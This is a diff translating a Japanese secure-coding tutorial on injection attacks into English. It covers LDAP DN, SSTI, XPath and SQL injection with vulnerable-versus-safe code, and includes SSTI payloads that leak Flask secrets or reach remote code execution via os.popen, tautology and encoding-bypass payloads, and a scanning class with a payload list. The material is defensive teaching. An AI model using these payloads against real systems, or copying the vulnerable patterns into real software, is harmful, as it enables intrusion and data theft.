-  LDAP フィルタとは別に、DN にもインジェクションの危険がある。
+  DN is also vulnerable to injection, separate from LDAP filters.
 
-  正常: cn=alice,ou=users,dc=example,dc=com
-  攻撃: cn=alice,ou=admin,ou=users,dc=example,dc=com
-  → 管理者の OU にアクセスしようとする
+  Normal: cn=alice,ou=users,dc=example,dc=com
+  Attack: cn=alice,ou=admin,ou=users,dc=example,dc=com
+  → Attempts to access the admin OU
 
-  DN エスケープ対象文字（RFC 4514）:
+  DN escape characters (RFC 4514):
   +--------+------------------+
-  | 文字   | エスケープ       |
+  | Char   | Escaped          |
   +--------+------------------+
   | ,      | \,               |
   | +      | \+               |
@@ -725,42 +725,42 @@ LDAP DN インジェクション:
   | <      | \<               |
   | >      | \>               |
   | ;      | \;               |
-  | 先頭#  | \#               |
-  | 先頭/末尾スペース | \20  |
+  | leading # | \#            |
+  | leading/trailing space | \20 |
   +--------+------------------+
 ```
 
 ---
 
-## 6. テンプレートインジェクション（SSTI）
+## 6. Template Injection (SSTI)
 
 ```python
-# コード例10: Server-Side Template Injection (SSTI)
+# Code example 10: Server-Side Template Injection (SSTI)
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 @app.route("/greet")
 def greet_vulnerable():
     name = request.args.get("name", "")
-    # ユーザー入力をテンプレートとして解釈 → SSTI!
+    # User input interpreted as a template → SSTI!
     template = f"<h1>Hello, {name}!</h1>"
     return render_template_string(template)
-    # 攻撃: name = {{7*7}} → "Hello, 49!"
-    # 攻撃: name = {{config.SECRET_KEY}} → 秘密鍵が漏洩
-    # 攻撃: name = {{''.__class__.__mro__[1].__subclasses__()}}
-    #   → Python のクラス階層を辿ってRCE（リモートコード実行）
+    # Attack: name = {{7*7}} → "Hello, 49!"
+    # Attack: name = {{config.SECRET_KEY}} → secret key is leaked
+    # Attack: name = {{''.__class__.__mro__[1].__subclasses__()}}
+    #   → Traverses Python class hierarchy for RCE (remote code execution)
 
-# === 安全なコード ===
+# === Safe code ===
 @app.route("/greet")
 def greet_safe():
     name = request.args.get("name", "")
-    # テンプレートを固定し、変数として渡す
+    # Fix the template and pass name as a variable
     return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
-    # {{ name }} はデータとして扱われ、テンプレート構文として解釈されない
+    # {{ name }} is treated as data, not interpreted as template syntax
 
-# === さらに安全: Jinja2 サンドボックス ===
+# === Even safer: Jinja2 sandbox ===
 from jinja2.sandbox import SandboxedEnvironment
 
 sandbox = SandboxedEnvironment()
@@ -773,39 +773,39 @@ def greet_sandbox():
 ```
 
 ```
-SSTI の攻撃チェーン（Jinja2の場合）:
+SSTI attack chain (for Jinja2):
 
-  Step 1: テンプレートエンジンの特定
+  Step 1: Identify the template engine
   {{7*7}} → 49 (Jinja2/Twig)
   ${7*7} → 49 (Freemarker/Velocity)
   #{7*7} → 49 (Ruby ERB)
 
-  Step 2: 情報収集
-  {{config}} → Flask設定の漏洩
-  {{self}} → テンプレートオブジェクト
+  Step 2: Information gathering
+  {{config}} → Flask configuration leaked
+  {{self}} → Template object
 
-  Step 3: RCE（リモートコード実行）
+  Step 3: RCE (remote code execution)
   Jinja2:
   {{''.__class__.__mro__[1].__subclasses__()[X]}}
-  → X = subprocess.Popen のインデックス
-  → os.popen('id').read() の実行
+  → X = index of subprocess.Popen
+  → Execute os.popen('id').read()
 
-  対策:
-  1. ユーザー入力をテンプレートの一部にしない
-  2. テンプレートは固定し、変数として渡す
-  3. SandboxedEnvironment を使用
-  4. テンプレートの自動リロードを無効にする
+  Countermeasures:
+  1. Do not embed user input into template strings
+  2. Fix the template and pass input as a variable
+  3. Use SandboxedEnvironment
+  4. Disable automatic template reloading
 ```
 
 ---
 
-## 7. XPath インジェクション
+## 7. XPath Injection
 
 ```python
-# コード例11: XPath インジェクションの攻撃と対策
+# Code example 11: XPath injection attacks and defenses
 from lxml import etree
 
-# XML データ
+# XML data
 xml_data = """
 <users>
     <user>
@@ -823,20 +823,20 @@ xml_data = """
 
 tree = etree.fromstring(xml_data.encode())
 
-# === 脆弱なコード ===
+# === Vulnerable code ===
 def auth_vulnerable(username, password):
-    """文字列連結によるXPath構築"""
+    """Build XPath by string concatenation"""
     xpath = f"//user[username='{username}' and password='{password}']"
-    # 攻撃: username = "' or '1'='1' or '"
+    # Attack: username = "' or '1'='1' or '"
     # XPath: //user[username='' or '1'='1' or '' and password='']
-    # → 全ユーザーにマッチ
+    # → Matches all users
     result = tree.xpath(xpath)
     return len(result) > 0
 
-# === 安全なコード ===
+# === Safe code ===
 def auth_safe(username, password):
-    """XPath 変数を使用した安全なクエリ"""
-    # lxml の XPath 変数バインディング
+    """Safe query using XPath variables"""
+    # XPath variable binding in lxml
     xpath = "//user[username=$username and password=$password]"
     result = tree.xpath(
         xpath,
@@ -848,84 +848,84 @@ def auth_safe(username, password):
 
 ---
 
-## 8. インジェクション防御の体系
+## 8. Systematic Injection Defense
 
 ```
-インジェクション防御の多層構造:
+Multi-layered injection defense:
 
-  Layer 1: 入力バリデーション
+  Layer 1: Input validation
   +----------------------------------------------+
-  | ホワイトリスト、型チェック、長さ制限            |
-  | 正規表現パターンマッチ、文字種制限              |
-  +----------------------------------------------+
-                      |
-  Layer 2: パラメータ化 / ORM
-  +----------------------------------------------+
-  | データとコードの分離、プリペアドステートメント   |
-  | ORM のクエリビルダー                           |
+  | Whitelist, type checking, length limits        |
+  | Regex pattern matching, character restrictions |
   +----------------------------------------------+
                       |
-  Layer 3: 出力エンコード
+  Layer 2: Parameterization / ORM
   +----------------------------------------------+
-  | コンテキスト別エスケープ（HTML/SQL/Shell/LDAP）|
-  | テンプレートエンジンの自動エスケープ            |
-  +----------------------------------------------+
-                      |
-  Layer 4: 最小権限
-  +----------------------------------------------+
-  | DB権限の制限、サンドボックス、WAF              |
-  | OS レベルのアクセス制御                        |
+  | Separation of data and code, prepared statements |
+  | ORM query builders                            |
   +----------------------------------------------+
                       |
-  Layer 5: 検知と監視
+  Layer 3: Output encoding
   +----------------------------------------------+
-  | WAF ログ、SQLエラーログ監視、異常検知           |
-  | ペネトレーションテスト                         |
+  | Context-specific escaping (HTML/SQL/Shell/LDAP) |
+  | Automatic escaping by template engines        |
+  +----------------------------------------------+
+                      |
+  Layer 4: Least privilege
+  +----------------------------------------------+
+  | Restrict DB permissions, sandbox, WAF         |
+  | OS-level access control                       |
+  +----------------------------------------------+
+                      |
+  Layer 5: Detection and monitoring
+  +----------------------------------------------+
+  | WAF logs, SQL error log monitoring, anomaly detection |
+  | Penetration testing                           |
   +----------------------------------------------+
 ```
 
-### インジェクション種別の対策比較
+### Comparison of Countermeasures by Injection Type
 
-| インジェクション種別 | 根本対策 | 補助対策 | テストツール |
-|-------------------|---------|---------|------------|
-| SQL | パラメータ化クエリ | WAF、最小権限DB | SQLMap |
-| NoSQL | 型チェック、演算子フィルタ | スキーマ検証 | NoSQLMap |
-| コマンド | shell=False、引数リスト | 入力ホワイトリスト | Commix |
-| LDAP | 特殊文字エスケープ | 入力バリデーション | LDAP Injection Tester |
-| XPath | パラメータ化XPath | 入力制限 | - |
-| テンプレート | サンドボックス + 変数分離 | テンプレートエンジン設定 | tplmap |
-| Header | ヘッダー値のサニタイズ | 改行文字の除去 | Burp Suite |
+| Injection type | Root countermeasure | Supplementary countermeasure | Testing tools |
+|----------------|--------------------|-----------------------------|---------------|
+| SQL | Parameterized queries | WAF, least-privilege DB | SQLMap |
+| NoSQL | Type checking, operator filtering | Schema validation | NoSQLMap |
+| Command | shell=False, argument list | Input whitelist | Commix |
+| LDAP | Special character escaping | Input validation | LDAP Injection Tester |
+| XPath | Parameterized XPath | Input restrictions | - |
+| Template | Sandbox + variable separation | Template engine settings | tplmap |
+| Header | Header value sanitization | Remove newline characters | Burp Suite |
 
-### データベース権限の最小化
+### Minimizing Database Permissions
 
 ```sql
--- コード例12: DB権限の最小化（MySQL）
+-- Code example 12: Minimizing DB permissions (MySQL)
 
--- アプリケーション用ユーザーの作成（最小権限）
+-- Create application user (least privilege)
 CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_password';
 
--- 必要なテーブルへの SELECT/INSERT/UPDATE のみ付与
+-- Grant only SELECT/INSERT/UPDATE on necessary tables
 GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'%';
 GRANT SELECT, INSERT ON myapp.orders TO 'app_user'@'%';
 
--- DELETE は特定の条件でのみ許可（ストアドプロシージャ経由）
--- 直接の DELETE 権限は付与しない
+-- DELETE only allowed under specific conditions (via stored procedure)
+-- Do not grant direct DELETE permission
 
--- 危険な権限を付与しない
--- GRANT FILE ON *.* → ファイル読み書きが可能になる
--- GRANT PROCESS ON *.* → プロセスリストが見える
--- GRANT SUPER ON *.* → 管理者操作が可能
+-- Do not grant dangerous permissions
+-- GRANT FILE ON *.* → enables file read/write
+-- GRANT PROCESS ON *.* → exposes process list
+-- GRANT SUPER ON *.* → allows admin operations
 
--- 読み取り専用ユーザー（レポート用）
+-- Read-only user (for reporting)
 CREATE USER 'report_user'@'%' IDENTIFIED BY 'another_password';
 GRANT SELECT ON myapp.* TO 'report_user'@'%';
 
--- 権限の確認
+-- Verify permissions
 SHOW GRANTS FOR 'app_user'@'%';
 ```
 
 ```python
-# コード例13: SQLAlchemy でのデータベース接続とエラーハンドリング
+# Code example 13: Database connection and error handling with SQLAlchemy
 from sqlalchemy import create_engine, text
 from sqlalchemy.orm import sessionmaker
 from sqlalchemy.exc import SQLAlchemyError
@@ -933,51 +933,51 @@ import logging
 
 logger = logging.getLogger(__name__)
 
-# エンジン作成（接続プールの設定）
+# Create engine (connection pool settings)
 engine = create_engine(
     "postgresql://app_user:password@localhost/myapp",
     pool_size=10,
     max_overflow=20,
     pool_recycle=3600,
-    echo=False,  # 本番ではSQLログを出力しない（情報漏洩防止）
+    echo=False,  # Do not output SQL logs in production (prevent info leakage)
 )
 
 Session = sessionmaker(bind=engine)
 
 class UserRepository:
-    """安全なデータアクセス層"""
+    """Safe data access layer"""
 
     def find_by_username(self, username: str):
-        """ORMを使用した安全なクエリ"""
+        """Safe query using ORM"""
         with Session() as session:
             try:
                 return session.query(User).filter(
                     User.username == username
                 ).first()
             except SQLAlchemyError as e:
-                # エラーメッセージにSQL詳細を含めない
+                # Do not include SQL details in error messages
                 logger.error(f"Database error: {type(e).__name__}")
-                raise ApplicationError("データの取得に失敗しました")
+                raise ApplicationError("Failed to retrieve data")
 
     def search_users(self, keyword: str, limit: int = 50):
-        """LIKE検索の安全な実装"""
+        """Safe implementation of LIKE search"""
         with Session() as session:
-            # LIKE のワイルドカード文字をエスケープ
+            # Escape LIKE wildcard characters
             safe_keyword = keyword.replace('%', r'\%').replace('_', r'\_')
             return session.query(User).filter(
                 User.username.ilike(f"%{safe_keyword}%", escape='\\')
-            ).limit(min(limit, 100)).all()  # 上限を設定
+            ).limit(min(limit, 100)).all()  # Set upper limit
 
     def execute_raw_query(self, query_template: str, params: dict):
-        """生SQLが必要な場合の安全な実行"""
+        """Safe execution when raw SQL is necessary"""
         with Session() as session:
-            # text() + バインドパラメータを必ず使用
+            # Always use text() + bind parameters
             stmt = text(query_template)
             return session.execute(stmt, params).fetchall()
 
-# 使用例
+# Usage example
 repo = UserRepository()
-user = repo.find_by_username("alice")  # パラメータ化される
+user = repo.find_by_username("alice")  # Parameterized
 results = repo.execute_raw_query(
     "SELECT * FROM users WHERE created_at > :date AND status = :status",
     {"date": "2024-01-01", "status": "active"}
@@ -986,14 +986,14 @@ results = repo.execute_raw_query(
 
 ---
 
-## 9. エッジケース
+## 9. Edge Cases
 
-### エッジケース1: ストアドプロシージャ内のインジェクション
+### Edge Case 1: Injection Inside Stored Procedures
 
 ```sql
--- ストアドプロシージャでも動的SQLは危険
+-- Dynamic SQL inside stored procedures is also dangerous
 
--- NG: ストアドプロシージャ内で文字列連結
+-- NG: String concatenation inside a stored procedure
 CREATE PROCEDURE search_users(IN search_term VARCHAR(100))
 BEGIN
     SET @sql = CONCAT('SELECT * FROM users WHERE name LIKE "%',
@@ -1002,7 +1002,7 @@ BEGIN
     EXECUTE stmt;
 END;
 
--- OK: パラメータバインディングを使用
+-- OK: Use parameter binding
 CREATE PROCEDURE search_users_safe(IN search_term VARCHAR(100))
 BEGIN
     SET @search = CONCAT('%', search_term, '%');
@@ -1012,25 +1012,25 @@ BEGIN
 END;
 ```
 
-### エッジケース2: ORMでの安全でない使用
+### Edge Case 2: Unsafe Patterns with ORM
 
 ```python
-# ORM を使っていても安全でないパターン
+# Unsafe patterns even when using ORM
 
 from sqlalchemy import text
 
-# NG: text() 内で文字列連結
+# NG: String concatenation inside text()
 def search_unsafe(keyword):
     query = text(f"SELECT * FROM users WHERE name LIKE '%{keyword}%'")
     return db.execute(query).fetchall()
 
-# NG: filter() 内で文字列結合
+# NG: String concatenation inside filter()
 def search_unsafe2(column_name, value):
-    # カラム名を動的に指定 → インジェクション可能
+    # Dynamically specifying column name → injection possible
     query = text(f"SELECT * FROM users WHERE {column_name} = :value")
     return db.execute(query, {"value": value}).fetchall()
 
-# OK: カラム名もホワイトリストで検証
+# OK: Validate column name with whitelist
 ALLOWED_COLUMNS = {"username", "email", "status"}
 
 def search_safe(column_name, value):
@@ -1040,39 +1040,39 @@ def search_safe(column_name, value):
     return db.execute(query, {"value": value}).fetchall()
 ```
 
-### エッジケース3: エンコーディングに起因するバイパス
+### Edge Case 3: Bypass via Encoding
 
 ```
-マルチバイト文字によるエスケープバイパス:
+Escape bypass using multibyte characters:
 
-  GBK/Shift_JIS 環境での問題:
-  - バックスラッシュ(\) は0x5c
-  - GBKの一部の文字の2バイト目が0x5c
-  - 例: 0xbf5c は GBK で有効な文字
+  Issue in GBK/Shift_JIS environments:
+  - Backslash (\) is 0x5c
+  - The second byte of some GBK characters is 0x5c
+  - Example: 0xbf5c is a valid GBK character
 
-  攻撃:
-  入力: 0xbf27 (0xbf + シングルクォート)
-  エスケープ後: 0xbf5c27 (0xbf + バックスラッシュ + シングルクォート)
-  GBK解釈: [有効な2バイト文字]' ← クォートがエスケープされない!
+  Attack:
+  Input: 0xbf27 (0xbf + single quote)
+  After escaping: 0xbf5c27 (0xbf + backslash + single quote)
+  GBK interpretation: [valid 2-byte char]' ← quote is not escaped!
 
-  対策:
-  - UTF-8 を使用し、文字エンコーディングを統一する
-  - SET NAMES utf8mb4 を接続時に設定
-  - パラメータ化クエリを使用（エンコーディング問題を回避）
-  - mysql_real_escape_string 等のDB固有のエスケープ関数を使用
+  Countermeasures:
+  - Use UTF-8 and unify character encoding
+  - Set SET NAMES utf8mb4 at connection time
+  - Use parameterized queries (avoids encoding issues)
+  - Use DB-specific escape functions like mysql_real_escape_string
 ```
 
 ---
 
-## 10. テスト手法
+## 10. Testing Methods
 
 ```python
-# コード例14: インジェクション脆弱性のテスト
+# Code example 14: Testing for injection vulnerabilities
 import requests
 from typing import List, Dict
 
 class InjectionTester:
-    """インジェクション脆弱性の基本テスト"""
+    """Basic testing for injection vulnerabilities"""
 
     SQL_PAYLOADS = [
         "' OR '1'='1",
@@ -1097,7 +1097,7 @@ class InjectionTester:
     ]
 
     def test_sql_injection(self, url: str, param: str) -> List[Dict]:
-        """SQLインジェクションの基本テスト"""
+        """Basic SQL injection test"""
         results = []
         baseline = requests.get(url, params={param: "normal_value"})
 
@@ -1105,13 +1105,13 @@ class InjectionTester:
             response = requests.get(url, params={param: payload})
             suspicious = False
 
-            # 異常な応答の検出
+            # Detect abnormal responses
             if response.status_code == 500:
-                suspicious = True  # SQLエラー
+                suspicious = True  # SQL error
             if "sql" in response.text.lower() or "syntax" in response.text.lower():
-                suspicious = True  # エラーメッセージ漏洩
+                suspicious = True  # Error message disclosure
             if len(response.text) != len(baseline.text):
-                suspicious = True  # レスポンスサイズの変化
+                suspicious = True  # Response size change
 
             results.append({
                 "payload": payload,
@@ -1123,7 +1123,7 @@ class InjectionTester:
         return results
 
     def test_error_disclosure(self, url: str, param: str) -> Dict:
-        """エラーメッセージにDB情報が含まれていないか確認"""
+        """Check whether error messages contain DB information"""
         error_indicators = [
             "mysql", "postgresql", "sqlite", "oracle",
             "syntax error", "unclosed quotation",
@@ -1137,48 +1137,48 @@ class InjectionTester:
             "indicators_found": found,
         }
 
-# 使用例（必ず許可された環境でのみ実行すること）
+# Usage example (only run in permitted environments)
 # tester = InjectionTester()
 # results = tester.test_sql_injection("http://localhost:8080/search", "q")
 ```
 
 ---
 
-## 11. パフォーマンスに関する考察
+## 11. Performance Considerations
 
 ```
-パラメータ化クエリのパフォーマンス効果:
+Performance effects of parameterized queries:
 
-  文字列連結 vs パラメータ化クエリ:
+  String concatenation vs. parameterized queries:
 
   +----------------------------+------------------+------------------+
-  | 項目                       | 文字列連結       | パラメータ化     |
+  | Item                       | String concat    | Parameterized    |
   +----------------------------+------------------+------------------+
-  | クエリプラン               | 毎回生成          | キャッシュ可能   |
-  | パース処理                 | 毎回実行          | 初回のみ         |
-  | セキュリティ               | 脆弱              | 安全             |
-  | 10,000回実行時の速度比較   | 1.0x (基準)       | 0.7x-0.9x (速い)|
+  | Query plan                 | Generated each time | Cacheable     |
+  | Parse processing           | Executed each time | First time only |
+  | Security                   | Vulnerable       | Safe             |
+  | Speed comparison (10,000 runs) | 1.0x (baseline) | 0.7x-0.9x (faster) |
   +----------------------------+------------------+------------------+
 
-  ORM のオーバーヘッド:
-  - クエリ生成: +0.1-0.5ms (ほとんどの場合無視できる)
-  - N+1 問題: eager loading で対処
-  - 複雑なクエリ: 生SQL + パラメータバインディング
+  ORM overhead:
+  - Query generation: +0.1-0.5ms (negligible in most cases)
+  - N+1 problem: address with eager loading
+  - Complex queries: raw SQL + parameter binding
 
-  パフォーマンスとセキュリティはトレードオフではない。
-  パラメータ化クエリは安全性とパフォーマンスの両方を向上させる。
+  Performance and security are not a trade-off.
+  Parameterized queries improve both safety and performance.
 ```
 
 ---
 
-## 演習
+## Exercises
 
-### 演習1: 基礎 — パラメータ化クエリへの書き換え
+### Exercise 1: Basic — Rewrite with Parameterized Queries
 
-**課題**: 以下の脆弱なコードをパラメータ化クエリに書き換えよ。
+**Task**: Rewrite the following vulnerable code using parameterized queries.
 
 ```python
-# 書き換え対象:
+# Target for rewrite:
 def search_products(category, min_price, max_price, sort_by):
     query = f"""
     SELECT * FROM products
@@ -1188,77 +1188,77 @@ def search_products(category, min_price, max_price, sort_by):
     """
     return db.execute(query).fetchall()
 
-# ヒント:
-# - category, min_price, max_price はパラメータ化
-# - sort_by はホワイトリストで検証（パラメータ化できない部分）
+# Hints:
+# - Parameterize category, min_price, max_price
+# - Validate sort_by with a whitelist (cannot be parameterized)
 ```
 
-### 演習2: 応用 — 包括的な入力バリデーション
+### Exercise 2: Applied — Comprehensive Input Validation
 
-**課題**: 以下の要件を満たすバリデーションクラスを実装せよ。
-
-```
-要件:
-1. 文字列型のバリデーション（長さ、パターン、禁止文字）
-2. 数値型のバリデーション（範囲、整数/浮動小数）
-3. メールアドレスのバリデーション
-4. SQLインジェクション / NoSQLインジェクションの検出
-5. バリデーションエラーの詳細レポート
-6. カスタムルールの追加が可能な拡張性
-```
-
-### 演習3: 発展 — セキュアなCRUD API
-
-**課題**: FastAPI + SQLAlchemy で以下を満たすAPIを実装せよ。
+**Task**: Implement a validation class that satisfies the following requirements.
 
 ```
-要件:
-1. ユーザーの CRUD 操作 (Create, Read, Update, Delete)
-2. すべてのSQL操作がパラメータ化されていること
-3. 入力バリデーション (Pydantic モデル)
-4. エラーメッセージにDB情報を含めないこと
-5. 検索機能で LIKE 句のワイルドカードをエスケープ
-6. ページネーション（limit/offset の上限設定）
-7. SQL ログの適切な管理（本番ではクエリ内容を出力しない）
+Requirements:
+1. String validation (length, pattern, forbidden characters)
+2. Numeric validation (range, integer/float)
+3. Email address validation
+4. SQL injection / NoSQL injection detection
+5. Detailed validation error reports
+6. Extensibility to add custom rules
+```
 
-検証:
-- sqlmap でテストして脆弱性がないことを確認
+### Exercise 3: Advanced — Secure CRUD API
+
+**Task**: Implement an API using FastAPI + SQLAlchemy that satisfies the following.
+
+```
+Requirements:
+1. CRUD operations for users (Create, Read, Update, Delete)
+2. All SQL operations must be parameterized
+3. Input validation (Pydantic models)
+4. Error messages must not include DB information
+5. Escape LIKE wildcards in search functionality
+6. Pagination (set upper limits for limit/offset)
+7. Proper SQL log management (do not output query content in production)
+
+Verification:
+- Confirm no vulnerabilities when tested with sqlmap
 ```
 
 ---
 
-## アンチパターン
+## Anti-patterns
 
-### アンチパターン1: ブラックリストによるフィルタリング
+### Anti-pattern 1: Filtering with a Blacklist
 
-`SELECT`、`DROP` 等の危険なキーワードをフィルタするアプローチ。バイパス手法は無数にあり（大文字小文字の混在、エンコーディング、コメント挿入等）、根本的な対策にはならない。パラメータ化クエリが唯一の正解である。
+An approach that filters dangerous keywords like `SELECT` and `DROP`. There are countless bypass techniques (mixed case, encoding, comment insertion, etc.) and it does not constitute a fundamental countermeasure. Parameterized queries are the only correct solution.
 
 ```python
-# NG: ブラックリスト方式
+# NG: Blacklist approach
 BLACKLIST = ["SELECT", "DROP", "DELETE", "UNION", "INSERT", "--", ";"]
 
 def sanitize_input_bad(value):
     for keyword in BLACKLIST:
         value = value.replace(keyword, "")
     return value
-# バイパス: "SELSELECTECT" → "SELECT" (除去後に元に戻る)
-# バイパス: "sel/**/ect" → ブラックリストにマッチしない
+# Bypass: "SELSELECTECT" → "SELECT" (restored after removal)
+# Bypass: "sel/**/ect" → does not match the blacklist
 
-# OK: パラメータ化クエリ
+# OK: Parameterized query
 def query_safe(value):
     return db.execute("SELECT * FROM users WHERE name = ?", (value,))
 ```
 
-### アンチパターン2: クライアントサイドのみのバリデーション
+### Anti-pattern 2: Validation on the Client Side Only
 
-フロントエンドのJavaScriptでのみ入力検証を行うパターン。攻撃者はブラウザを経由せずAPIに直接リクエストを送信できるため、必ずサーバーサイドでバリデーションを実施する。
+A pattern where input validation is only performed in front-end JavaScript. Attackers can send requests directly to the API without going through the browser, so always validate on the server side.
 
 ```python
-# NG: クライアントサイドのみ
-# JavaScript: if (input.includes("'")) { alert("不正な文字"); }
-# → curl で直接 API にリクエスト送信されたら無意味
+# NG: Client-side only
+# JavaScript: if (input.includes("'")) { alert("Invalid character"); }
+# → Useless if the API is called directly with curl
 
-# OK: サーバーサイドで必ずバリデーション
+# OK: Always validate on the server side
 from pydantic import BaseModel, validator
 
 class SearchInput(BaseModel):
@@ -1273,72 +1273,72 @@ class SearchInput(BaseModel):
         return v
 ```
 
-### アンチパターン3: エラーメッセージの過剰な露出
+### Anti-pattern 3: Excessive Exposure of Error Messages
 
 ```python
-# NG: SQLエラーをそのままユーザーに返す
+# NG: Return SQL errors directly to the user
 @app.route("/search")
 def search():
     try:
         result = db.execute(f"SELECT * FROM users WHERE id={request.args['id']}")
     except Exception as e:
         return f"Error: {str(e)}", 500
-    # → "Error: near "OR": syntax error" のようなメッセージが
-    #   攻撃者にDBの種類やクエリ構造のヒントを与える
+    # → Messages like "Error: near "OR": syntax error"
+    #   give attackers hints about the DB type and query structure
 
-# OK: 汎用的なエラーメッセージ + 内部ログ
+# OK: Generic error message + internal log
 @app.route("/search")
 def search():
     try:
         result = db.execute("SELECT * FROM users WHERE id=?",
                            (request.args['id'],))
     except Exception as e:
-        logger.error(f"Database error: {e}")  # 詳細は内部ログのみ
-        return {"error": "リクエストの処理に失敗しました"}, 500
+        logger.error(f"Database error: {e}")  # Details only in internal log
+        return {"error": "Failed to process the request"}, 500
 ```
 
 
 ---
 
-## 実践演習
+## Practical Exercises
 
-### 演習1: 基本的な実装
+### Exercise 1: Basic Implementation
 
-以下の要件を満たすコードを実装してください。
+Implement code that satisfies the following requirements.
 
-**要件:**
-- 入力データの検証を行うこと
-- エラーハンドリングを適切に実装すること
-- テストコードも作成すること
+**Requirements:**
+- Validate input data
+- Implement proper error handling
+- Also write test code
 
 ```python
-# 演習1: 基本実装のテンプレート
+# Exercise 1: Template for basic implementation
 class Exercise1:
-    """基本的な実装パターンの演習"""
+    """Exercise for basic implementation patterns"""
 
     def __init__(self):
         self.data = []
 
     def validate_input(self, value):
-        """入力値の検証"""
+        """Validate input value"""
         if value is None:
-            raise ValueError("入力値がNoneです")
+            raise ValueError("Input value is None")
         return True
 
     def process(self, value):
-        """データ処理のメインロジック"""
+        """Main logic for data processing"""
         self.validate_input(value)
         self.data.append(value)
         return self.data
 
     def get_results(self):
-        """処理結果の取得"""
+        """Retrieve processing results"""
         return {
             'count': len(self.data),
             'data': self.data
         }
 
-# テスト
+# Tests
 def test_exercise1():
     ex = Exercise1()
     assert ex.process(1) == [1]
@@ -1347,26 +1347,26 @@ def test_exercise1():
 
     try:
         ex.process(None)
-        assert False, "例外が発生するべき"
+        assert False, "Exception should have been raised"
     except ValueError:
         pass
 
-    print("全テスト合格!")
+    print("All tests passed!")
 
 test_exercise1()
 ```
 
-### 演習2: 応用パターン
+### Exercise 2: Applied Pattern
 
-基本実装を拡張して、以下の機能を追加してください。
+Extend the basic implementation to add the following features.
 
 ```python
-# 演習2: 応用パターン
+# Exercise 2: Applied pattern
 from typing import List, Dict, Optional
 from datetime import datetime
 
 class AdvancedExercise:
-    """応用パターンの演習"""
+    """Exercise for applied patterns"""
 
     def __init__(self, max_size: int = 100):
         self._items: List[Dict] = []
@@ -1374,7 +1374,7 @@ class AdvancedExercise:
         self._created_at = datetime.now()
 
     def add(self, key: str, value: any) -> bool:
-        """アイテムの追加（サイズ制限付き）"""
+        """Add an item (with size limit)"""
         if len(self._items) >= self._max_size:
             return False
         self._items.append({
@@ -1385,14 +1385,14 @@ class AdvancedExercise:
         return True
 
     def find(self, key: str) -> Optional[Dict]:
-        """キーによる検索"""
+        """Search by key"""
         for item in reversed(self._items):
             if item['key'] == key:
                 return item
         return None
 
     def remove(self, key: str) -> bool:
-        """キーによる削除"""
+        """Delete by key"""
         for i, item in enumerate(self._items):
             if item['key'] == key:
                 self._items.pop(i)
@@ -1400,7 +1400,7 @@ class AdvancedExercise:
         return False
 
     def stats(self) -> Dict:
-        """統計情報"""
+        """Statistics"""
         return {
             'total_items': len(self._items),
             'max_size': self._max_size,
@@ -1408,44 +1408,44 @@ class AdvancedExercise:
             'uptime': str(datetime.now() - self._created_at)
         }
 
-# テスト
+# Tests
 def test_advanced():
     ex = AdvancedExercise(max_size=3)
     assert ex.add("a", 1) == True
     assert ex.add("b", 2) == True
     assert ex.add("c", 3) == True
-    assert ex.add("d", 4) == False  # サイズ制限
+    assert ex.add("d", 4) == False  # Size limit
     assert ex.find("b")['value'] == 2
     assert ex.remove("b") == True
     assert ex.find("b") is None
     stats = ex.stats()
     assert stats['total_items'] == 2
-    print("応用テスト全合格!")
+    print("All advanced tests passed!")
 
 test_advanced()
 ```
 
-### 演習3: パフォーマンス最適化
+### Exercise 3: Performance Optimization
 
-以下のコードのパフォーマンスを改善してください。
+Improve the performance of the following code.
 
 ```python
-# 演習3: パフォーマンス最適化
+# Exercise 3: Performance optimization
 import time
 from functools import lru_cache
 
-# 最適化前（O(n^2)）
+# Before optimization (O(n^2))
 def slow_search(data: list, target: int) -> int:
-    """非効率な検索"""
+    """Inefficient search"""
     for i in range(len(data)):
         for j in range(i + 1, len(data)):
             if data[i] + data[j] == target:
                 return (i, j)
     return (-1, -1)
 
-# 最適化後（O(n)）
+# After optimization (O(n))
 def fast_search(data: list, target: int) -> tuple:
-    """ハッシュマップを使った効率的な検索"""
+    """Efficient search using a hash map"""
     seen = {}
     for i, num in enumerate(data):
         complement = target - num
@@ -1454,7 +1454,7 @@ def fast_search(data: list, target: int) -> tuple:
         seen[num] = i
     return (-1, -1)
 
-# ベンチマーク
+# Benchmark
 def benchmark():
     import random
     data = list(range(5000))
@@ -1469,57 +1469,57 @@ def benchmark():
     result2 = fast_search(data, target)
     fast_time = time.time() - start
 
-    print(f"非効率版: {slow_time:.4f}秒")
-    print(f"効率版:   {fast_time:.6f}秒")
-    print(f"高速化率: {slow_time/fast_time:.0f}倍")
+    print(f"Slow version: {slow_time:.4f}s")
+    print(f"Fast version: {fast_time:.6f}s")
+    print(f"Speedup: {slow_time/fast_time:.0f}x")
 
 benchmark()
 ```
 
-**ポイント:**
-- アルゴリズムの計算量を意識する
-- 適切なデータ構造を選択する
-- ベンチマークで効果を測定する
+**Key points:**
+- Be aware of algorithm time complexity
+- Choose appropriate data structures
+- Measure the effect with benchmarks
 ---
 
 ## FAQ
 
-### Q1: ORMを使っていればSQLインジェクションは完全に防げますか?
+### Q1: If I use an ORM, can SQL injection be completely prevented?
 
-ほぼ防げるが、完全ではない。ORMでも`raw()`や`execute()`で直接SQLを書く場合や、文字列連結でクエリを構築する場合にはSQLインジェクションが発生する。また、ORMの特定バージョンに脆弱性が存在する場合もある。ORM使用時でも、生SQLを書く場合は必ずパラメータバインディングを使用すること。
+Almost, but not completely. Even with an ORM, SQL injection can occur when writing raw SQL via `raw()` or `execute()`, or when building queries by string concatenation. Specific ORM versions may also have vulnerabilities. Even when using an ORM, always use parameter binding when writing raw SQL.
 
-### Q2: WAFだけでインジェクションを防げますか?
+### Q2: Can WAF alone prevent injection?
 
-WAFだけでは不十分。WAFはシグネチャベースの検出であり、高度なバイパス手法には対応できない場合がある。WAFは補助的な防御層として位置づけ、パラメータ化クエリ等の根本対策と併用すべきである。WAFの誤検知（False Positive）により正常なリクエストがブロックされるリスクもある。
+WAF alone is insufficient. WAF uses signature-based detection and may not handle advanced bypass techniques. WAF should be treated as a supplementary defense layer and used in combination with root-cause countermeasures like parameterized queries. WAF false positives (false positives) also risk blocking legitimate requests.
 
-### Q3: プリペアドステートメントとパラメータ化クエリは同じものですか?
+### Q3: Are prepared statements and parameterized queries the same thing?
 
